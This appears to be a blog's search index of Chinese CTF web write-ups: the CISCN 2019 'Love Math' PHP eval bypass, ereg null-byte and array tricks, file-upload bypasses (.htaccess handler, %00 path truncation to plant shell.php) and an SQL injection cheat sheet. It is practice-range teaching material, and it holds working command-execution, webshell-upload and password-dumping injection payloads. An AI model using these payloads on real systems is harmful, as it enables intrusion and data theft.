<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>(CISCN 2019 初赛)Love Math</title>
    <url>/2020/10/13/CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math/</url>
    <content><![CDATA[<blockquote>
<p>BUUCTF练习靶场：<a href="https://buuoj.cn/" title="BUUCTF">点击直达</a></p>
</blockquote>
<a id="more"></a>

<hr>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><blockquote>
<p>思路来自于某大佬的Writeup：<a href="https://blog.csdn.net/miuzzx/article/details/">https://blog.csdn.net/miuzzx/article/details/</a>    </p>
</blockquote>
<p>题目直接给出了源码  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#39;c&#39;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    &#x2F;&#x2F;例子 c&#x3D;20-1</span><br><span class="line">    $content &#x3D; $_GET[&#39;c&#39;];</span><br><span class="line">    if (strlen($content) &gt;&#x3D; 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist &#x3D; [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;&#96;&#39;, &#39;\[&#39;, &#39;\]&#39;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#39;&#x2F;&#39; . $blackitem . &#39;&#x2F;m&#39;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;常用数学函数http:&#x2F;&#x2F;www.w3school.com.cn&#x2F;php&#x2F;php_ref_math.asp</span><br><span class="line">    $whitelist &#x3D; [&#39;abs&#39;, &#39;acos&#39;, &#39;acos&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];</span><br><span class="line">    preg_match_all(&#39;&#x2F;[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*&#x2F;&#39;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;帮你算出答案</span><br><span class="line">    eval(&#39;echo &#39;.$content.&#39;;&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>GET传递的变量必须设置，不然就返回源码  </li>
<li>变量长度不能等于或超过80  </li>
<li>payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’</li>
<li>payload中不能有不是$whitelist白名单里面的单词出现</li>
</ol>
<hr>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>php中可以把函数名通过字符串的方式传递给一个变量，然后通过此变量动态调用函数，比如：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$a&#x3D;&#39;system&#39;;</span><br><span class="line">$a(&#39;ls&#39;); &#x2F;&#x2F;返回当前文件所在目录信息</span><br></pre></td></tr></table></figure>
<p>题目中有长度限制我们可以尝试构造$_GET[]然后在传入想用的exp，但是这里把中括号下划线禁用了，那么就得需要编码绕过了。<br>通过白名单我们看到了一些可能帮助我们编码绕过的函数：base_convert()，dechex()<br>base_convert()可以进行进制之间的转换，如： base_convert(“1001”2,10)是将二进制的1001转换为10进制。<br>dechex()则是将10进制转成16进制。<br>我们先来写下我们要构造的payload：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?c&#x3D;$_GET[a]($_GET[b])&amp;a&#x3D;system&amp;b&#x3D;cat flag</span><br><span class="line">构造$_GET[a]和$_GET[b]，把a和b的值分别传入system和cat，这样$_GET[a]($_GET[b])就等于system(&#39;cat flag&#39;)了</span><br></pre></td></tr></table></figure>
<p>但是中括号被禁用了，这时我们可以用花括号{}代替。<br>要构造的字符串为 _GET，php中有将16进制转成字符串的函数hex2bin()，那就需要想办法生成hex2bin。<br>可以用我们白名单中的base_convert函数生成hex2bin，36进制也就是base36中有字母和数字正好可以满足生成条件。<br>所以 base_convert(37907361743,10,36)=hex2bin。因为我们是要得到_GET所以就得用到另外一个函数dechex()将_GET的10进制转为16进制，再通过hex2bin转换为字符串。<br>所以_GET=base_convert(37907361743,10,36)(dechex(1598506324))。<br>现在已经可以构造出$_GET[]了，将上面的payload修改下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c&#x3D;$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;pi&#125;($$pi&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;cat &#x2F;flag</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>CG-CTF/x00</title>
    <url>/2020/10/05/CG-CTF-x00/</url>
    <content><![CDATA[<blockquote>
<p>题目链接：<br><a href="http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php">http://teamxlc.sinaapp.com/web4/f5a14f5e6e3453b78cd73899bad98d53/index.php</a></p>
</blockquote>
<a id="more"></a>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><img src="/2020/10/05/CG-CTF-x00/1.png" class>

<p>要求以GET方式传递的nctf参数必须为数字但又要含有#biubiiubiu，我用了两种方法解题  </p>
<hr>
<h2 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h2><p>构造url：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00#biubiubiu</span><br></pre></td></tr></table></figure>
<img src="/2020/10/05/CG-CTF-x00/2.png" class>  

<p>再次构造url：  </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf&#x3D;1%00%23biubiubiu  </span><br></pre></td></tr></table></figure>
<img src="/2020/10/05/CG-CTF-x00/3.png" class>  

<hr>
<h2 id="数组绕过"><a href="#数组绕过" class="headerlink" title="数组绕过"></a>数组绕过</h2><p>构造url：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;teamxlc.sinaapp.com&#x2F;web4&#x2F;f5a14f5e6e3453b78cd73899bad98d53&#x2F;index.php?nctf[]&#x3D;</span><br></pre></td></tr></table></figure>
<img src="/2020/10/05/CG-CTF-x00/4.png" class>  

<hr>
<h2 id="方法解析"><a href="#方法解析" class="headerlink" title="方法解析"></a>方法解析</h2><h3 id="ereg-函数："><a href="#ereg-函数：" class="headerlink" title="ereg()函数："></a>ereg()函数：</h3><p>用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。题中ereg()正则限制了传入的nctf参数的形式，只能为一个或多个数字。ereg()函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配。ereg()函数只能处理字符串，遇到数组做参数返回NULL，判断用的是 === ，要求类型也相同，而NULL跟FALSE类型是不同的,strpos()的参数同样不能为数组，否则返回NULL，而判断用的是 !== ，所以这里的条件成立，也能得到flag。</p>
<h3 id="strpos-函数："><a href="#strpos-函数：" class="headerlink" title="strpos()函数："></a>strpos()函数：</h3><p>查找字符串在另一字符串中第一次出现的位置（区分大小写）</p>
<p>在方法一00截断中我们首先构造了?nctf=1%00#biubiubiu ，但是发现页面返回了 “骚年，继续努力吧啊~”，通过burp suite看到我们传递的参数?nctf =1%00#biubiubiu并没有发送出去，%00后面的内容没有了  </p>
<img src="/2020/10/05/CG-CTF-x00/5.png" class>  

<hr>
<blockquote>
<p>以下内容转载于：<a href="https://segmentfault.com/a/1190000013006640">https://segmentfault.com/a/1190000013006640</a>  </p>
</blockquote>
<p>我去网上搜了一下有关url栏中#的解读：  </p>
<h3 id="1、-的含义"><a href="#1、-的含义" class="headerlink" title=" 1、#的含义 "></a><font color="##FF0000"> 1、#的含义 </font></h3><p>#代表网页中的一个位置。其右面的字符，就是该位置的标识符。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;index.html#print</span><br></pre></td></tr></table></figure>
<p>代表网页index.html的print位置。浏览器读取这个URL后，会自动将print位置滚动至可视区域。  </p>
<p>为网页位置指定标识符，有两个方法。一是使用锚点，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;a name&#x3D;&quot;print&quot;&gt;&lt;&#x2F;a&gt;，二是使用id属性，比如&lt;div id&#x3D;&quot;print&quot; &gt;  </span><br></pre></td></tr></table></figure>

<h3 id="2、HTTP请求不包括"><a href="#2、HTTP请求不包括" class="headerlink" title=" 2、HTTP请求不包括# "></a><font color="##FF0000"> 2、HTTP请求不包括# </font></h3><p>#是用来指导浏览器动作的，对服务器端完全无用。所以，HTTP请求中不包括#。<br>比如，访问下面的网址：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;index.html#print</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">浏览器实际发出的请求是这样的： </span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">GET &#x2F;index.html HTTP&#x2F;1.1  </span><br><span class="line">Host: www.example.com</span><br></pre></td></tr></table></figure>
<p>可以看到，只是请求index.html，根本没有”#print”的部分。  </p>
<h3 id="3、-后的字符"><a href="#3、-后的字符" class="headerlink" title=" 3、#后的字符 "></a><font color="##FF0000"> 3、#后的字符 </font></h3><p>在第一个#后面出现的任何字符，都会被浏览器解读为位置标识符。这意味着，这些字符都不会被发送到服务器端。<br>比如，下面URL的原意是指定一个颜色值：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;?color&#x3D;#fff</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">但是，浏览器实际发出的请求是：</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line">GET &#x2F;?color&#x3D; HTTP&#x2F;1.1  </span><br><span class="line">Host: www.example.com</span><br><span class="line">&#96;&#96;&#96;  </span><br><span class="line"></span><br><span class="line">可以看到，”#fff”被省略了。只有将#转码为%23，浏览器才会将其作为实义字符处理。也就是说，上面的网址应该被写成：</span><br><span class="line">&#96;&#96;&#96; </span><br><span class="line">http:&#x2F;&#x2F;example.com&#x2F;?color&#x3D;%23fff</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>CTF练习平台</title>
    <url>/2020/09/21/CTF%E9%9D%B6%E5%9C%BA%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<p>新手——进阶——writeup</p>
<a id="more"></a>
<h2 id="新手"><a href="#新手" class="headerlink" title="新手"></a>新手</h2><blockquote>
<p>bugku：<a href="https://www.ctfhub.com/" title="bugku">点击直达</a><br>南邮CTF：<a href="https://cgctf.nuptsast.com/challenges#Web" title="南邮CTF">点击直达</a><br>CTFHub：<a href="https://www.ctfhub.com/#/index" title="CTFHub">点击直达</a><br>攻防世界：<a href="https://adworld.xctf.org.cn/" title="攻防世界">点击直达</a>  </p>
</blockquote>
<hr>
<h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><blockquote>
<p>i春秋：<a href="https://www.ichunqiu.com/battalion" title="CTFHub">点击直达</a><br>BUUCTF：<a href="https://buuoj.cn/" title="BUUCTF">点击直达</a><br>X计划平台：<a href="https://www.linkedbyx.com/home" title="X计划平台">点击直达</a>  </p>
</blockquote>
<hr>
<h2 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h2><p>颖奇L’Amore：<a href="https://www.gem-love.com/" title="颖奇L&#39;Amore">点击直达</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传小结（基础）</title>
    <url>/2020/09/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
    <content><![CDATA[<blockquote>
<p>练习靶场：<a href="https://www.ctfhub.com/" title="CTFHub">CTFHub</a></p>
</blockquote>
<a id="more"></a>
<h1 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h1><h2 id="前端验证绕过"><a href="#前端验证绕过" class="headerlink" title=" 前端验证绕过 "></a><font color="#FF0000"> 前端验证绕过 </font></h2><blockquote>
<p>前端代码无法被burp suite抓取到，绕过前端验证的方法一般是先上传一个正常图片后缀的文件（jpg/png/gif），之后再通过burp suite抓取请求，把上传请求中的（jpg/png/gif）后缀改为php后再把请求发送出去。  </p>
</blockquote>
<hr>
<h2 id="后端验证绕过"><a href="#后端验证绕过" class="headerlink" title=" 后端验证绕过 "></a><font color="#FF0000"> 后端验证绕过 </font></h2><h3 id="1-文件头、文件类型绕过-MIME"><a href="#1-文件头、文件类型绕过-MIME" class="headerlink" title="1. 文件头、文件类型绕过(MIME)"></a>1. 文件头、文件类型绕过(MIME)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例代码:</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">error_reporting(0);</span><br><span class="line">&#x2F;&#x2F;设置上传目录</span><br><span class="line">define(&quot;UPLOAD_PATH&quot;, dirname(__FILE__) . &quot;&#x2F;upload&#x2F;&quot;);</span><br><span class="line">define(&quot;UPLOAD_URL_PATH&quot;, str_replace($_SERVER[&#39;DOCUMENT_ROOT&#39;], &quot;&quot;, UPLOAD_PATH));</span><br><span class="line">if (!file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">    mkdir(UPLOAD_PATH, 0755);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!empty($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    if (!$_FILES[&#39;file&#39;][&#39;size&#39;]) &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#39;请添加上传文件&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $file &#x3D; fopen($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &quot;rb&quot;);</span><br><span class="line">        $bin &#x3D; fread($file, 4);</span><br><span class="line">        fclose($file);</span><br><span class="line">        if (!in_array($_FILES[&#39;file&#39;][&#39;type&#39;], [&quot;image&#x2F;jpeg&quot;, &quot;image&#x2F;jpg&quot;, &quot;image&#x2F;png&quot;, &quot;image&#x2F;gif&quot;])) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        &#125; else if (!in_array(bin2hex($bin), [&quot;89504E47&quot;, &quot;FFD8FFE0&quot;, &quot;47494638&quot;])) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;文件错误&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $name &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">            if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . $name)) &#123;</span><br><span class="line">                echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">                echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-代码审计"><a href="#2-代码审计" class="headerlink" title="2. 代码审计"></a>2. 代码审计</h3><blockquote>
<p>代码先用if语句对文件类型进行数组白名单核对，如果文件类型不在数组中则返回“文件类型不正确, 只允许上传 jpeg jpg png gif 类型的文件”，若文件类型在数组中则执行下一个else if语句检查文件头是否在数组中，文件头如果在数组中文件就能上传成功</p>
</blockquote>
<h3 id="3-常见文件头："><a href="#3-常见文件头：" class="headerlink" title="3. 常见文件头："></a>3. 常见文件头：</h3><blockquote>
<p>PNG (89 50 4E 47 0D 0A 1A 0A)，JPG (FF D8 DD E0 00 10 4A 46)，GIF (47 49 46 38 39 61 CA 03)  </p>
</blockquote>
<h3 id="4-绕过方法："><a href="#4-绕过方法：" class="headerlink" title="4. 绕过方法："></a>4. 绕过方法：</h3><blockquote>
<p>在文件首部添加文件头的字符串编码（将16进制文件头转化为字符串写入文件中或者直接用winhex将16进制代码写入进去），把具有图片文件头的文件上传用burp suite抓取，改文件后缀为php再把请求发送出去。  </p>
</blockquote>
<hr>
<h1 id="htaccess绕过"><a href="#htaccess绕过" class="headerlink" title=" .htaccess绕过 "></a><font color="#FF0000"> .htaccess绕过 </font></h1><blockquote>
<p>常见的黑名单检测代码如下图。  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例代码:</span><br><span class="line">&lt;?php</span><br><span class="line">if (!empty($_POST[&#39;submit&#39;])) &#123;</span><br><span class="line">    $name &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">    $ext &#x3D; pathinfo($name)[&#39;extension&#39;];</span><br><span class="line">    $blacklist &#x3D; array(&quot;php&quot;, &quot;php7&quot;, &quot;php5&quot;, &quot;php4&quot;, &quot;php3&quot;, &quot;phtml&quot;, &quot;pht&quot;, &quot;jsp&quot;, &quot;jspa&quot;, &quot;jspx&quot;, &quot;jsw&quot;, &quot;jsv&quot;, &quot;jspf&quot;, &quot;jtml&quot;, &quot;asp&quot;, &quot;aspx&quot;, &quot;asa&quot;, &quot;asax&quot;, &quot;ascx&quot;, &quot;ashx&quot;, &quot;asmx&quot;, &quot;cer&quot;, &quot;swf&quot;);</span><br><span class="line">    if (!in_array($ext, $blacklist)) &#123;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . $name)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">            echo &quot;上传文件相对路径&lt;br&gt;&quot; . UPLOAD_URL_PATH . $name;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;script&gt;alert(&#39;文件类型不匹配&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="1-代码审计"><a href="#1-代码审计" class="headerlink" title="1. 代码审计"></a>1. 代码审计</h2><blockquote>
<p>代码把常见的网页可执行文件后缀放在一个数组黑名单，if语句判断文件扩展名（后缀）是否在黑名单中。如果不在黑名单（!in_array前面的!表示否），执行嵌套在if里面的if语句——移动上传文件到网站上传文件存放路径。如果在黑名单执行else语句——返回上传失败  </p>
</blockquote>
<h2 id="2-绕过方法"><a href="#2-绕过方法" class="headerlink" title="2. 绕过方法"></a>2. 绕过方法</h2><blockquote>
<p>黑名单没有对.htaccess关键字过滤，可以上传.htaccess文件（分布式配置文件）进行绕过  </p>
</blockquote>
<h2 id="3-htaccess代码"><a href="#3-htaccess代码" class="headerlink" title="3. .htaccess代码"></a>3. .htaccess代码</h2><blockquote>
<p>&lt;FilesMatch jpg|png|gif&gt;<br>     SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;  </p>
</blockquote>
<h2 id="4-htaccess代码含义"><a href="#4-htaccess代码含义" class="headerlink" title="4..htaccess代码含义"></a>4..htaccess代码含义</h2><blockquote>
<p>让Apache把当前.htaccess文件所在的目录下的jpg|png|gif图片文件当作php文件解析  </p>
</blockquote>
<hr>
<h1 id="00截断"><a href="#00截断" class="headerlink" title=" 00截断 "></a><font color="#FF0000"> 00截断 </font></h1><blockquote>
<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题，magic_quotes_gpc需要为OFF  </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">示例代码:</span><br><span class="line">&lt;?php</span><br><span class="line">if (!empty($_POST[&#39;submit&#39;])) &#123; </span><br><span class="line">    $name &#x3D; basename($_FILES[&#39;file&#39;][&#39;name&#39;]);</span><br><span class="line">    $info &#x3D; pathinfo($name);</span><br><span class="line">    $ext &#x3D; $info[&#39;extension&#39;];</span><br><span class="line">    $whitelist &#x3D; array(&quot;jpg&quot;, &quot;png&quot;, &quot;gif&quot;);</span><br><span class="line">    if (in_array($ext, $whitelist)) &#123;</span><br><span class="line">        $des &#x3D; $_GET[&#39;road&#39;] . &quot;&#x2F;&quot; . rand(10, 99) . date(&quot;YmdHis&quot;) . &quot;.&quot; . $ext;</span><br><span class="line">        if (move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], $des)) &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;上传成功&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;&lt;script&gt;alert(&#39;上传失败&#39;)&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;文件类型不匹配&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><blockquote>
<p>代码做了一个白名单数组匹配，文件后缀只有在白名单中才能上传成功。并且上传之后文件会重命名（随机字符串+年月日小时分钟秒），会将$des变量和重命名文件进行拼接，$des变量内容是由$_GET[‘road’]获取的</p>
</blockquote>
<h2 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h2><blockquote>
<p>因为上传后重新生成的文件名我们不知道，所以我们不能在filename参数后面截断  </p>
</blockquote>
<img src="/2020/09/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/3.png" class>  

<blockquote>
<p>代码会将路径和文件进行拼接，再看看请求信息发现有个GET参数road=/var/www/html/upload，很明显这是一个上传路径。可以利用这个路径进行00路径截断。在路径后面添加shell.php%00（把shell.php当成一个目录），路径和文件拼接的时候会截断（忽略）%00后面的内容。因为shell.php目录不存在，因此shell.php就变成了上传文件的文件名</p>
</blockquote>
<img src="/2020/09/20/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%B0%8F%E7%BB%93%EF%BC%88%E5%9F%BA%E7%A1%80%EF%BC%89/4.png" class>

<blockquote>
<p>关于00截断原理的一些思考：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80545408?utm_medium=distribute.pc_relevant.none-task-blog-title-1&spm=1001.2101.3001.4242" title="CSDN">点击加载</a></p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
        <category>WEB</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入常见代码</title>
    <url>/2020/09/21/sql%E6%B3%A8%E5%85%A5%E5%B8%B8%E8%A7%81%E4%BB%A3%E7%A0%81/</url>
    <content><![CDATA[<p>sql注入</p>
<a id="more"></a>
<h3 id="常规注入（假设表中字段数为2）"><a href="#常规注入（假设表中字段数为2）" class="headerlink" title=" 常规注入（假设表中字段数为2）"></a><font color="#FF0000"> 常规注入（假设表中字段数为2）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">判断字段：order by 2</span><br><span class="line">Union联合查询:  union select 1,2  </span><br><span class="line">union select 1,(database()) ----数据库dvwa  </span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.columns where table_schema&#x3D;database()) ----表users,guestbook  </span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’) ----字段 first_name,last_name,user,password  </span><br><span class="line">union select 1,(select group_concat(user,0x7e,password) from dvwa.users) ----查询出用户名与密码：admin、123456  </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------数据库information_schema中需要记住的表：</span><br><span class="line">① Schemata表（存储该用户所有数据库的库名）需要记住该表中记录数据库库名的字段名为schema_name</span><br><span class="line">② Tables表（存储该用户创建的所有数据库的库名和表名）需要记住该表中记录数据库库名和表名的宇段名分别为table_schema和table_name</span><br><span class="line">③ columns表（存储该用户创建的所有数据库的库名、表名和宇段名）需要记住该表中记录数据库库名、表名和宇段名的字段名为table_schema、table_name和column_name</span><br><span class="line"></span><br><span class="line">一般用columns表查询，columns表存储着该用户的数据库名、表名、字段名的字段</span><br><span class="line">输出数量有限制时用limit，select (user,,0x7e,password) from dvwa.users limit 0,1</span><br></pre></td></tr></table></figure>



<h3 id="盲注（无sql语句错误回显）"><a href="#盲注（无sql语句错误回显）" class="headerlink" title=" 盲注（无sql语句错误回显）"></a><font color="#FF0000"> 盲注（无sql语句错误回显）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查询时只返回查询成功的值和失败的值，不会像union查询那样回显sql语句错误。例如分别查询1,2,3 分别换回 小明，小红，小刚。查询1’,2’,3’返回空值或其他提示（非sql语句错误之类的提示）</span><br><span class="line"></span><br><span class="line">盲注判断语句：</span><br><span class="line">① 1’ and length(database())&gt;&#x3D;1# ----判断数据库名是否大于1，如果大于1返回正常查询1的结果，反之返回其他</span><br><span class="line">② 1’ and substr(database(),1,1)&#x3D;”d”# ----substr是截取的意思，其意思是截取database()的值，从第一个字符开始，每次只返回一个值（substr(database(),2,1) 表示从第二个字符开始，每次只返回一个值）</span><br><span class="line">④ 1’ and ord(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码</span><br><span class="line">⑤ 1’ and ascii(substr(database(),1,1))&#x3D;97# ----截取database()的第一个值并转化为ASCII码（与④一样）</span><br></pre></td></tr></table></figure>



<h3 id="报错注入"><a href="#报错注入" class="headerlink" title=" 报错注入"></a><font color="#FF0000"> 报错注入</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">程序直接将错误信息输出到了页面上（也可使用union注入），可以利用报错注入获取数据。报错注入有多种格式，此处利用函数updatexml（）演示SQL语句获取user（）的值</span><br><span class="line">Sql语句：1’ and updatexml(l,concat(0x7e,(select use()），θx7e),1)#</span><br></pre></td></tr></table></figure>




<h3 id="时间注入（时间盲注）"><a href="#时间注入（时间盲注）" class="headerlink" title=" 时间注入（时间盲注）"></a><font color="#FF0000"> 时间注入（时间盲注）</font></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">构建错误sql查询语句时无返回查询失败的值，但是可以利用sleep()或benchmark（）等函数让MySQL的执行时间变长来进行sql注入</span><br><span class="line"></span><br><span class="line">时间盲注多与IF(expr1 ,expr2 ,expr3) 结合使用，此IF语句含义是：如果expr1是TRUE，则IF（）的返回值为expr2；否则返回值则为expr3。</span><br><span class="line">判断数据库库名长度的语句应为：</span><br><span class="line">① if(length(database())&gt;1,sleep(5),1) ----如果数据库库名的长度大于1，则MySQL查询休眠5秒，否则查询1</span><br><span class="line">② if(substr(database(),1, 1)&#x3D;’s’,sleep(5),1) ----如果数据库库名第一位是s，则MySQL查询休眠5秒，否则查询1</span><br></pre></td></tr></table></figure>

